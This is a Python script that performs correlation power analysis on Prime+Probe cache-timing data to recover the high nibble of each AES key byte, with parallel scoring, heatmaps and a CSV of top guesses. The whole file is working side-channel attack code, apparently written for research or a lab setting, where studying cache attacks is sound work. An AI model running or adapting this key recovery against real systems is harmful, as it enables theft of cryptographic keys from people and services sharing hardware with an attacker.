"""
AES key (only high nibble) recovery from Prime+Probe cache attack output file using CPA.

Steps:
- Load data (plaintexts and cache timings)
- Use CPA per key byte to find best matching high nibble
- Save results, generate heatmaps and top guess CSV

Usage:
  python key_recovery_cpa.py -i ./data/output.txt.gz -o ./report/recovered_key.txt -d ./report/heatmaps --csv .report/top_guesses.csv
"""

import argparse
import csv
import gzip
import os
from collections import defaultdict
from multiprocessing import Pool, cpu_count

import matplotlib.pyplot as plt
import numpy as np
import plotly.express as px
import plotly.io as pio
import seaborn as sns
from tqdm import tqdm


def load_data(filename):
    """Load plaintexts and timing measurements from output.txt or .gz."""
    pts, times = [], []
    opener = gzip.open if filename.endswith('.gz') else open
    with opener(filename, 'rt') as f:
        for lineno, line in enumerate(f):
            parts = line.strip().split()
            if len(parts) < 66:
                continue
            pt_hex = parts[0]
            vals = list(map(int, parts[2:]))
            if len(vals) != 64:
                continue
            pts.append([int(pt_hex[i:i + 2], 16) for i in range(0, 32, 2)])
            times.append(vals)
    return np.array(pts, dtype=np.uint8), np.array(times, dtype=np.float32)


def _score_key_byte(task):
    """CPA for one key byte and return score matrix and best guesses."""
    byte_idx, plaintexts, times_arr = task
    pts = plaintexts[:, byte_idx]
    table_idx = byte_idx % 4
    table_times = times_arr[:, table_idx * 16:(table_idx + 1) * 16]
    n = len(pts)

    corr_matrix = np.zeros((256, 16), dtype=np.float32)
    top_guesses = []

    for k in range(256):
        predicted = (np.bitwise_xor(pts, k) // 16).astype(np.int32)
        for line in range(16):
            mask = (predicted == line).astype(np.float32)
            if mask.sum() == 0 or mask.sum() == n:
                continue
            times_line = table_times[:, line]
            if np.all(times_line == times_line[0]):
                continue
            mat = np.corrcoef(mask, times_line)
            if mat.shape != (2, 2):
                continue
            corr_val = abs(mat[0, 1])
            corr_matrix[k, line] = corr_val

    scores = corr_matrix.max(axis=1)
    top_5 = np.argsort(scores)[-5:][::-1]
    for guess in top_5:
        top_guesses.append((int(guess), float(scores[guess])))

    best_guess = top_5[0]
    best_score = scores[best_guess]
    return byte_idx, int(best_guess), float(best_score), corr_matrix, top_guesses


def recover_key_bytes(plaintexts, times_arr, processes=None):
    """CPA in parallel on all 16 bytes."""
    if processes is None:
        processes = cpu_count()
    tasks = [(b, plaintexts, times_arr) for b in range(16)]
    corr_matrices, results, top_guesses_all = {}, [], []

    with Pool(processes) as pool:
        for byte_idx, guess, score, mat, top5 in tqdm(
                pool.imap_unordered(_score_key_byte, tasks),
                total=16, desc="Recovering key byte per byte"
        ):
            corr_matrices[byte_idx] = mat
            results.append((byte_idx, guess, score))
            top_guesses_all.append((byte_idx, top5))

    results.sort(key=lambda x: x[0])
    key_bytes = bytes((guess & 0xf0) for _, guess, _ in results)
    return key_bytes, corr_matrices, results, top_guesses_all


def generate_heatmaps(corr_matrices, out_dir):
    """Create one heatmap per byte and one combined (high nibble only)."""
    os.makedirs(out_dir, exist_ok=True)
    combined = np.zeros((16, 256))

    for byte_idx, matrix in sorted(corr_matrices.items()):
        scores = matrix.max(axis=1)
        combined[byte_idx] = scores

        fig, ax = plt.subplots(figsize=(10, 6))
        sns.heatmap(matrix, cmap='plasma', xticklabels=[f"L{l}" for l in range(16)], yticklabels=False, ax=ax)
        step = max(1, matrix.shape[0] // 16)
        ticks = list(range(0, 256, step))
        ax.set_yticks([t + 0.5 for t in ticks])
        ax.set_yticklabels([f"{t:02x}" for t in ticks], rotation=0)
        ax.set_title(f"CPA Corr: Byte {byte_idx} (Table {byte_idx % 4})")
        ax.set_xlabel('Cache Line')
        ax.set_ylabel('Key Guess (hex)')
        fig.tight_layout()
        fig.savefig(os.path.join(out_dir, f"heatmap_byte_{byte_idx}.png"))
        plt.close(fig)

    # Combined heatmap
    collapsed = np.zeros((16, 16))
    for byte_idx in range(16):
        for high_nibble in range(16):
            start = high_nibble * 16
            end = start + 16
            collapsed[byte_idx, high_nibble] = np.max(combined[byte_idx, start:end])

    fig, ax = plt.subplots(figsize=(14, 6))
    sns.heatmap(collapsed, cmap="plasma",
                xticklabels=[f"0x{hn << 4:02x}" for hn in range(16)],
                yticklabels=[f"B{i}" for i in range(16)], ax=ax)
    ax.set_title("Top CPA-value per Key Guess (high nibble only)")
    ax.set_xlabel("High Nibble")
    ax.set_ylabel("Key Byte")
    fig.tight_layout()
    fig.savefig(os.path.join(out_dir, "combined_heatmap.png"))
    plt.close(fig)

    # Interactive heatmap
    fig_plotly = px.imshow(collapsed,
                           labels=dict(x="High Nibble", y="Key Byte", color="Corr"),
                           x=[f"0x{hn << 4:02x}" for hn in range(16)],
                           y=[f"B{i}" for i in range(16)],
                           color_continuous_scale='plasma')
    pio.write_html(fig_plotly, file=os.path.join(out_dir, "interactive_heatmap.html"), auto_open=False)


def export_top_guesses(top_guesses_all, out_file):
    """Save top 5 high nibble guesses per key byte to CSV."""
    with open(out_file, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(['Byte', 'Rank', 'HighNibble', 'Correlation'])

        for byte_idx, guesses in top_guesses_all:
            grouped = defaultdict(list)
            for k, c in guesses:
                high = k & 0xf0
                grouped[high].append((k, c))

            # Select max correlation per high nibble
            high_nibble_scores = {
                high: max(entries, key=lambda x: x[1])
                for high, entries in grouped.items()
            }

            sorted_nibbles = sorted(high_nibble_scores.items(), key=lambda item: item[1][1], reverse=True)
            for rank, (hn, (_, score)) in enumerate(sorted_nibbles[:5], 1):
                writer.writerow([byte_idx, rank, f"{hn:02x}", f"{score:.5f}"])


def parse_args():
    parser = argparse.ArgumentParser(description='AES CPA key recovery via Prime+Probe attack output file.')
    parser.add_argument('-i', '--input', type=str, required=True, help='Input file (.txt or .gz)')
    parser.add_argument('-o', '--output', type=str, help='Write recovered key to file')
    parser.add_argument('-d', '--heatmap-dir', type=str, help='Output directory for heatmaps')
    parser.add_argument('--csv', type=str, help='CSV output of top key guesses')
    parser.add_argument('-p', '--processes', type=int, default=cpu_count(), help='Number of processes')
    return parser.parse_args()


def main():
    args = parse_args()
    print(f"Loading data from: {args.input}")
    pts, times_arr = load_data(args.input)
    print(f"Loaded {pts.shape[0]} samples.")

    key_bytes, corr_matrices, results, top_guesses_all = recover_key_bytes(pts, times_arr, args.processes)
    key_hex = key_bytes.hex()
    print(f"[OK] Recovered AES key (64bit out of the 128bit key): {key_hex}")

    if args.output:
        with open(args.output, 'w') as f:
            f.write(key_hex)
        print(f"Key written to: {args.output}")

    if args.csv:
        export_top_guesses(top_guesses_all, args.csv)
        print(f"Top guesses exported to: {args.csv}")

    if args.heatmap_dir:
        print(f"Generating heatmaps in: {args.heatmap_dir}")
        generate_heatmaps(corr_matrices, args.heatmap_dir)

    print("Done!")


if __name__ == '__main__':
    main()
